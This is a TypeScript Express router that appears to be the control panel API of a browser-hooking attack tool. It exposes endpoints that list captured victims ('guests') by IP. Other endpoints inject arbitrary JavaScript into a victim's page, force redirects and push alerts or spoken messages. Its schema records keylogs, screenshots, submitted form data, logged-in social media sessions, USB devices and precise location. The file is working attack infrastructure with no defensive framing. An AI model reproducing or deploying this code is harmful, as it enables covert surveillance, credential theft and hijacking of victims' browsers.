import { Router } from 'express'

import { Guest } from '../datastore'
import * as status from 'http-status-codes'


const router = Router()

/**
 * @swagger
 *
 * /guests:
 *  get:
 *    description: Returns an array of captured Guests
 *    produces:
 *      - application/json
 *    responses:
 *      200:
 *        description: Guests objects
 *        schema:
 *          type: array
 *          items:
 *            $ref: '#/definitions/Guest'
 */
router.get('/guests', async (req, res) => {
    return res
        .status(status.OK)
        .json((await Guest.find({})).map(g => Object.assign({}, g)))
})


router.use('/guests/:ip', async (req, res, next) => {
    const { ip } = req.params

    if (req.params.hasOwnProperty('ip') && ip) {
        const guest:Guest = await Guest.findOne({ ip })

        if (guest) {
            res.locals.guest = Object.assign({}, guest)

            return next()
        } else return res.sendStatus(status.NOT_FOUND)
    } else return next()
})



/**
 * @swagger
 *
 * /guests/{ip}:
 *  get:
 *    description: Returns a Guest with specific IP
 *    produces:
 *      - application/json
 *    parameters:
 *      - name: ip
 *        description: Guest's ip address
 *        in: path
 *        required: true
 *        type: string
 *    responses:
 *      200:
 *        description: Guest's object
 *        schema:
 *          $ref: '#/definitions/Guest'
 *      404:
 *        description: Guest's not found
 */
router.get('/guests/:ip', async (req, res) => {
    return res
        .status(status.OK)
        .json(res.locals.guest)
})


/**
 * @swagger
 *
 * /guests/{ip}/alert/{message}:
 *  get:
 *    description: Send an alert notification to a specific guest
 *    produces:
 *      - application/json
 *    parameters:
 *      - name: ip
 *        description: Guest's ip address
 *        in: path
 *        required: true
 *        type: string
 *      - name: message
 *        description: Message to be sent to the guest
 *        in: path
 *        required: true
 *        type: string
 *    responses:
 *      200:
 *        description: Alert message is sent
 *      404:
 *        description: Guest's not found
 */
router.get('/guests/:ip/alert/:message', async (req, res) => {
    const { message } = req.params
    const { guest } = res.locals

    try { await res.locals.io.to(guest.sessionId).emit('alert', message) }
    catch (err) { return res.sendStatus(status.INTERNAL_SERVER_ERROR) }

    return res.sendStatus(status.OK)
})



/**
 * @swagger
 *
 * /guests/{ip}/redirect/{url}:
 *  get:
 *    description: Redirect a specific guest to a given URL
 *    produces:
 *      - application/json
 *    parameters:
 *      - name: ip
 *        description: Guest's ip address
 *        in: path
 *        required: true
 *        type: string
 *      - name: url
 *        description: URL link to redirect the guest to
 *        in: path
 *        required: true
 *        type: string
 *    responses:
 *      200:
 *        description: Session's redirected
 *      404:
 *        description: Guest's not found
 */
router.get('/guests/:ip/redirect/:url', async (req, res) => {
    const { url } = req.params
    const { guest } = res.locals

    try { await res.locals.io.to(guest.sessionId).emit('redirect', url) }
    catch (err) { return res.sendStatus(status.INTERNAL_SERVER_ERROR) }

    return res.sendStatus(status.OK)
})



/**
 * @swagger
 *
 * /guests/{ip}/say/{message}:
 *  get:
 *    description: Send a text-to-speech (TTS) notification to a specific guest
 *    produces:
 *      - application/json
 *    parameters:
 *      - name: ip
 *        description: Guest's ip address
 *        in: path
 *        required: true
 *        type: string
 *      - name: message
 *        description: Message to be sent to the guest
 *        in: path
 *        required: true
 *        type: string
 *    responses:
 *      200:
 *        description: Text-to-speech message is sent
 *      404:
 *        description: Guest's not found
 */
router.get('/guests/:ip/say/:message', async (req, res) => {
    const { message } = req.params
    const { guest } = res.locals

    try { await res.locals.io.to(guest.sessionId).emit('say', message) }
    catch (err) { return res.sendStatus(status.INTERNAL_SERVER_ERROR) }

    return res.sendStatus(status.OK)
})



/**
 * @swagger
 *
 * /guests/{ip}/inject:
 *  post:
 *    description: Inject a JavaScript code into a specific guest's web page
 *    produces:
 *      - application/json
 *    parameters:
 *      - name: ip
 *        description: Guest's ip address
 *        in: path
 *        required: true
 *        type: string
 *      - name: script
 *        in: body
 *        description: Object contains the JavaScript code
 *        schema:
 *          type: object
 *          properties:
 *            script:
 *              type: string
 *              required: true
 *    responses:
 *      200:
 *        description: JavaScript is injected
 *      400:
 *        description: Script is not passed
 *      404:
 *        description: Guest's not found
 */
router.post('/guests/:ip/inject', async (req, res) => {
    const { script } = req.body
    const { guest } = res.locals

    if (!script) return res.sendStatus(status.BAD_REQUEST)
    try { await res.locals.io.to(guest.sessionId).emit('inject', script) }
    catch (err) { return res.sendStatus(status.INTERNAL_SERVER_ERROR) }

    return res.sendStatus(status.OK)
})


/**
 * @swagger
 *
 * definitions:
 *
 *  Guest:
 *    type: object
 *    properties:
 *      ip:
 *        type: string
 *        description: guest's registered IP address
 *      online:
 *        type: boolean
 *        description: guest's current web session status
 *      sessionId:
 *        type: string
 *        description: guest's socket.io session's id
 *      os:
 *        type: string
 *        description: guest's detected operating system
 *      browser:
 *        type: string
 *        description: guest's detected web browser
 *      browserEngine:
 *        type: string
 *        description: guest's detected browser's engine
 *      cpuArch:
 *        type: string
 *        description: guest's detected CPU's architecture
 *      charging:
 *        type: boolean
 *        description: guest's detected battery charging status
 *      chargeLeft:
 *        type: string
 *        description: guest's detect battery charge left in percentage
 *      doNotTrack:
 *        type: string
 *        description: guest's browser "Do Not Track" status
 *      java:
 *        type: boolean
 *        description: guest's browser Java support
 *      flash:
 *        type: boolean
 *        description: guest's browser Flash support
 *      language:
 *        type: string
 *        description: guest's browser default language
 *      languages:
 *        type: array
 *        description: guest's browser supported languages
 *        items:
 *          type: string
 *      touch:
 *        type: boolean
 *        description: guest's device support for touchscreen
 *      usbDevices:
 *        type: array
 *        description: guest's connected USB devices
 *        items:
 *          type: string
 *      resolution:
 *        type: string
 *        description: guest's detected screen resolution
 *      posts:
 *        type: array
 *        description: logs of guest's performed POST requests
 *        items:
 *          $ref: '#/definitions/Post'
 *      logs:
 *        type: array
 *        description: logs of guest's perform GET requests
 *        items:
 *          type: string
 *      screenshots:
 *        type: array
 *        description: guest's captured screenshots in Base64 format
 *        items:
 *          type: string
 *      keyLogs:
 *        type: array
 *        description: guest's captured key logs
 *        items:
 *          $ref: '#/definitions/KeyLog'
 *      sessions:
 *        description: guest's social media and websites active sessions
 *        $ref: '#/definitions/Sessions'
 *      country:
 *        type: string
 *        description: guest's detected country
 *      countryCode:
 *        type: string
 *        description: guest's detected country-code
 *      regionName:
 *        type: string
 *        description: guest's detected region
 *      city:
 *        type: string
 *        description: guest's detected city
 *      zip:
 *        type: string
 *        description: guest's detected zip code
 *      lat:
 *        type: number
 *        description: guest's detected location latitude
 *      lon:
 *        type: number
 *        description: guest's detected location longitude
 *      timezone:
 *        type: string
 *        description: guest's detected timezone
 *      isp:
 *        type: string
 *        description: guest's detected internet service provider
 *      networkSpeed:
 *        description: guest's detected internet speed
 *        $ref: '#/definitions/NetworkSpeed'
 *
 *  Post:
 *    type: object
 *    properties:
 *      path:
 *        type: string
 *        description: URL link of the performed request
 *      date:
 *        type: string
 *        description: timestamp of the time request was performed
 *      data:
 *        type: object
 *        description: data that were sent in the request
 *
 *  KeyLog:
 *    type: object
 *    properties:
 *      url:
 *        type: string
 *        description: URL path where the key logs were captured
 *      date:
 *        type: string
 *        description: timestamp of the key log capture
 *      log:
 *        type: string
 *        description: captured key log content
 *
 *  Sessions:
 *    type: object
 *    properties:
 *      facebook:
 *        type: boolean
 *      youtube:
 *        type: boolean
 *      gmail:
 *        type: boolean
 *      spotify:
 *        type: boolean
 *      github:
 *        type: boolean
 *      instagram:
 *        type: boolean
 *      snapchat:
 *        type: boolean
 *      airbnb:
 *        type: boolean
 *
 *  NetworkSpeed:
 *    type: object
 *    properties:
 *      up:
 *        type: object
 *        description: upload speed
 *        properties:
 *          kbps:
 *            type: number
 *            description: kilobits per second
 *          mbps:
 *            type: number
 *            description: megabits per second
 *      down:
 *        type: object
 *        description: download speed
 *        properties:
 *          kbps:
 *            type: number
 *            description: kilobits per second
 *          mbps:
 *            type: number
 *            description: megabits per second
 */

export default router
